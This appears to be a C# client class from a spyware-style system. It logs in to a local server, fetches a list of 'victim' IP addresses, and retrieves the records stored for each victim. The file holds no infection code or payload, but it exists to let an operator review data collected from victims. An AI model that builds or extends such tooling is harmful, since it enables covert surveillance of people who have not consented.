using SpyCommunicationLib;
using SpyCommunicationLib.Directors;
using SpyCommunicationLib.Entities;
using System.Net.Sockets;
using System.Text;

namespace ClientInterface
{
    public class ClientService
    {
        private TcpClient _client;
        private NetworkStream _stream;

        private const string _host = "127.0.0.1";
        private const int _port = 8888;

        private readonly UserMessageDirector _director = new UserMessageDirector();

        public bool IsConnected => _client?.Connected ?? false;

        public async Task<bool> ConnectAsync()
        {
            try
            {
                _client = new TcpClient();
                await _client.ConnectAsync(_host, _port);
                _stream = _client.GetStream();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Client]: Connection error: {ex.Message}");
                return false;
            }
        }

        public async Task<SpyResponse<object>?> LoginAsync(string username, string password)
        {
            var message = _director.GetLogginMessage(username, password);
            string json = message.ToString();

            await SendAsync(json);
            string response = await ReceiveAsync();

            var result = SpySerializer.DeserializeResponse<object>(response);

            if (result == null || result.Code != ResponseCode.Success)
            {
                Console.WriteLine($"[Client]: Login failed. Code: {(int?)result?.Code}, Content: {result?.Content}");
                return null;
            }

            return result;
        }

        public async Task<SpyResponse<IEnumerable<string>>?> GetVictimIpListAsync()
        {
            var message = _director.GetVictimsIpListMessage();
            string json = message.ToString();

            await SendAsync(json);
            string response = await ReceiveAsync();

            var result = SpySerializer.DeserializeResponse<IEnumerable<string>>(response);

            if (result == null || result.Code != ResponseCode.Success)
            {
                Console.WriteLine($"[Client]: Failed to get victim IP list. Code: {(int?)result?.Code}, Content: {result?.Content}");
                return null;
            }

            return result;
        }

        public async Task<SpyResponse<IEnumerable<VictimRecord>>?> GetVictimRecordsAsync(string victimIp)
        {
            var message = _director.GetVictimRecordsMessage(victimIp);
            string json = message.ToString();

            await SendAsync(json);
            string response = await ReceiveAsync();

            var result = SpySerializer.DeserializeResponse<IEnumerable<VictimRecord>>(response);

            if (result == null || result.Code != ResponseCode.Success)
            {
                Console.WriteLine($"[Client]: Failed to get records for {victimIp}. Code: {(int?)result?.Code}, Content: {result?.Content}");
                return null;
            }

            return result;
        }



        private async Task SendAsync(string data)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(data);
            await _stream.WriteAsync(buffer, 0, buffer.Length);
        }

        private async Task<string> ReceiveAsync()
        {
            byte[] buffer = new byte[4096];
            int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
            return Encoding.UTF8.GetString(buffer, 0, bytesRead);
        }

        public void Disconnect()
        {
            _stream?.Close();
            _client?.Close();
        }
    }
}
